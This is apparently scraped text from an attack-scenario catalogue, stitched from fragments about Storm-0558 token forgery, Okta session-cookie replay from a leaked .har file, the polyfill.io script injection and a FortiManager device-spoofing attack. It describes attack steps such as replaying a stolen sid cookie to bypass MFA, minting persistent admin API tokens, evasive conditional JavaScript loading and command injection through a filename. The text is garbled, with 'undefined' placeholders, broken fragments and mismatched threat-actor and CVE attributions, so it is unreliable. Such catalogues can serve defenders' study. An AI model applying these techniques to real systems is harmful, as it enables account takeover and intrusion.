anomalous VPN IPs with zero matching interactive Entra ID sign-ins). In response to this federal agency discovery, Microsoft revoked the compromised MSA key, patched cross-realm token validation, and made Purview MailItemsAccessed logging available across standard M365 licensing tiers. In the documented PURVIEW MailItemsAccessed exchange from Exchange Online / OWA Validator to OWA Token-Minting API (/owa/), OWA Token-Minting API (/owa/) responds with RESP 342 Items Synced (confirming that the BULK_MAIL_EXFILTRATION request succeeded on OWA Token-Minting API (/owa/) and completing the final execution objective of Microsoft Threat Intel, Wiz & CISA, Storm-0558: Acquired MSA Consumer Signing Key & Forged OWA/Exchange Online Tokens). On the diagram, follow Step #3 / Link #3 (#3→ BULK_MAIL_EXFILTRATION / ⇠#3 RESP 342 Items Synced) from Node ③ (#3 Exchange Online / OWA Validator) to Node ④ (#4 OWA Token-Minting API (/owa/)), monitored by Node ⑥ (#6 Purview Audit & CISA AA23-193A Hunter).

In CloudTrail, the AttachUserPolicy call appears as originating from AssumedRole/LambdaAdminDeploymentRole/metrics-health-sync-tmp rather than directly from the ci-dev-deployer IAM user. - **Scenario ID:** `sysdig-scarleteel-aws-eks-terraform`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/sysdig-scarleteel-aws-eks-terraform
- **Category:** Cloud & SaaS (`CLOUD_SAAS`)

A .har file is not just a screenshot or timing chart; by specification, it is a full JSON archive of every HTTP request and response header, cookie, and POST body transmitted by the browser tab during recording.   2. **[undefined] undefined** (undefined): Because the sid cookie represents an already-unlocked session, replaying it from a VPN IP in another country skips the login and MFA screens completely, unless IP binding is turned on. Within 30 minutes of the .har file upload, the attacker sends an HTTPS GET request from a commercial VPN exit node (198.51.100.205, ASN 9009) to https://corp-admin.okta.com/admin/dashboard carrying Cookie: sid=102f8a9c7e4b... Why did BeyondTrust’s identity policy block the attacker at the console while other tenants allowed access? Because enforcing Admin Session IP Binding or device-bound Okta FastPass policies causes Okta to reject a valid sid cookie the moment the client IP or device posture changes. In the documented OKTA user.session.access_admin_app exchange from Perimeter Firewall & NDR Tap to Uploaded Browser .har Capture, Uploaded Browser .har Capture responds with ALERT MFA Bypassed via sid (confirming that the SESSION_ASN_ROAMING_DETECTED request succeeded on Uploaded Browser .har Capture and establishing the runtime state required for Step #3 MINTING PERSISTENT SSWS API TOKENS & SIRT SESSION REVOCATION).   3. **[undefined] undefined** (undefined): Knowing the stolen browser cookie will expire when the real admin logs out, the attacker rushes to mint a permanent SSWS API token, until the SOC’s ASN-roaming detector fires and kills both the session and the token! Because the stolen sid cookie is tied to the victim admin’s browser session lifetime, the attacker immediately navigates to Security -> API -> Tokens in the Okta Admin Console to invoke system.api_token.create (minting a static SSWS bearer token named "BackupSyncToken" and creating a secondary Super Admin user, which Cloudflare SIRT detected in real time via SIEM alerts on session ASN roaming and neutralized by calling DELETE /api/v1/users/{id}/sessions and revoking all newly created API tokens). Following this incident, Cloudflare released an open-source client-side HAR Sanitizer (har-sanitizer.pages.dev) that automatically strips Cookie, Set-Cookie, and Authorization values before engineers share .har files.   3. **[undefined] undefined** (undefined): To sneak past the censor who blacks out secret words in outgoing letters, the thief encodes the secret message twice in a row and prints it right in the public newspaper. For public repositories with public Actions logs, the attacker simply queried the GitHub REST API to download workflow logs containing the double-Base64 output and decoded the harvested AWS, npm, PyPI, and GitHub tokens offline. - **Scenario ID:** `polyfill-io-cdn-domain-supply-chain`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/polyfill-io-cdn-domain-supply-chain
- **Category:** Supply Chain & CI/CD (`SUPPLY_CHAIN_CICD`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2023-36884 (8.8 HIGH), CVE-2024-21412 (8.1 HIGH)
- **Attributed Threat Actors:** APT29 (Midnight Blizzard), TA551 (Shathak) & QakBot Affiliates
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): A website leaves an open window in its checkout page that automatically runs whatever script is handed through by an external domain name. Over 100,000 websites embedded <script src="https://cdn.polyfill.io/v2/polyfill.min.js"></script> without a Subresource Integrity (SRI) hash (integrity="sha384-...", a browser security attribute that verifies the cryptographic hash of a fetched script and refuses to execute it if a single byte changes), partially because polyfill.io was originally designed to return dynamic JS bundles tailored to each browser’s User-Agent. When ownership of the polyfill.io DNS domain changed hands in 2024, the new owner automatically inherited the ability to execute arbitrary JavaScript inside the first-party origin of every website still referencing that <script> tag. In the documented WAF exchange from Rogue CDN Operator (cdn.polyfill.io) to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ALERT T1195.002 (confirming that the Stage 1: Unpinned Third-Party <script> Tag Without Subresource Integrity (SRI) request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: HTTP User-Agent Fingerprinting & Evasive Payload Generation). On the diagram, follow Step #1 / Link #1 (#1→ Stage 1: Unpinned Third-Party <script> Tag Without Subresource Integrity (SRI) / ⇠#1 ALERT T1195.002) from Node ① (#1 Rogue CDN Operator (cdn.polyfill.io)) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 DOM Session Context & Redirect Target).
  2. **[undefined] undefined** (undefined): The rogue server checks the visitor’s ID at the door: if it sees a security inspector or a desktop computer, it hands out a clean brochure; if it sees a mobile phone in a targeted region, it slips in a hidden detonator. The compromised cdn.polyfill.io server evaluated each request’s HTTP User-Agent, Referer, and geolocation headers on the fly, appending heavily obfuscated JavaScript only for targeted mobile devices (iPhone / Android User-Agents) while returning benign polyfill code to desktop browsers, search engine crawlers, and pages containing admin analytics markers (window.google_analytics_admin, preventing site administrators from reproducing the infection during manual testing). The injected code also wrapped its execution in a 15-second setTimeout delay so automated headless browser scanners that only observe a page for 3–5 seconds after load would mark the script as clean. In the documented WAF exchange from Perimeter Firewall & NDR Tap to Enterprise Web Portal (<script src=...), Enterprise Web Portal (<script src=...) responds with ALERT T1027 (confirming that the Stage 2: HTTP User-Agent Fingerprinting & Evasive Payload Generation request succeeded on Enterprise Web Portal (<script src=...) and establishing the runtime state required for Step #3 Stage 3: First-Party DOM Execution & Silent Session Hijack / Redirection). On the diagram, follow Step #2 / Link #2 (#2→ Stage 2: HTTP User-Agent Fingerprinting & Evasive Payload Generation / ⇠#2 ALERT T1027) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 Enterprise Web Portal (<script src=...)), monitored by Node ⑥ (#6 DOM Session Context & Redirect Target).
  3. **[undefined] undefined** (undefined): Once the script runs inside the customer’s browser tab, it has the exact same authority as the store’s own checkout code. Because a <script src="..."> tag executes directly inside the host page’s Same-Origin Policy (SOP) context (giving third-party scripts full read/write access to the page DOM, localStorage, non-HttpOnly document.cookie values, and window.location), the payload dynamically appended a secondary loader (https://www.googie-anaiytics.com/gtags.js) and hijacked mobile user sessions. To neutralize the blast radius across the web, Cloudflare deployed automatic edge URL rewriting to swap cdn.polyfill.io with a clean mirror at cdnjs.cloudflare.com/polyfill, and the domain registrar placed polyfill.io on clientHold. In the documented WAF exchange from Enterprise Web Portal (<script src=...) to End-User Mobile Browser Session, End-User Mobile Browser Session responds with ALERT T1185 (confirming that the Stage 3: First-Party DOM Execution & Silent Session Hijack / Redirection request succeeded on End-User Mobile Browser Session and completing the final execution objective of cdn.polyfill.io CDN Domain Takeover & Conditional JS Injection (CVE-2024-38526)). On the diagram, follow Step #3 / Link #3 (#3→ Stage 3: First-Party DOM Execution & Silent Session Hijack / Redirection / ⇠#3 ALERT T1185) from Node ③ (#3 Enterprise Web Portal (<script src=...)) to Node ④ (#4 End-User Mobile Browser Session), monitored by Node ⑥ (#6 DOM Session Context & Redirect Target).

  2. **[undefined] undefined** (undefined): Even stores that locked their own front doors had installed an automatic chute that pulled whatever package was labeled "Latest Version 1" straight from the public warehouse into their lobby. This design bypassed build-time dependency pinning completely: every time a user loaded a dApp frontend in their browser, the browser fetched the latest 1.x build directly from cdn.jsdelivr.net.   1. **[undefined] undefined** (undefined): A stranger walks up to the branch-office check-in window, flashes a self-printed badge with a made-up branch number, and the system automatically registers them as an active branch. UNC5820 connected to TCP port 541 on internet-facing FortiManager appliances, completed a mutual TLS handshake using an arbitrary/self-signed certificate, and transmitted an FGFM request=get packet with channel=ip and a spoofed device serial number (serial=FGVM02TM...).   2. **[undefined] undefined** (undefined): Now that the system treats the stranger as a registered branch, the stranger sends a file check-out request with a shell command hidden inside the filename.
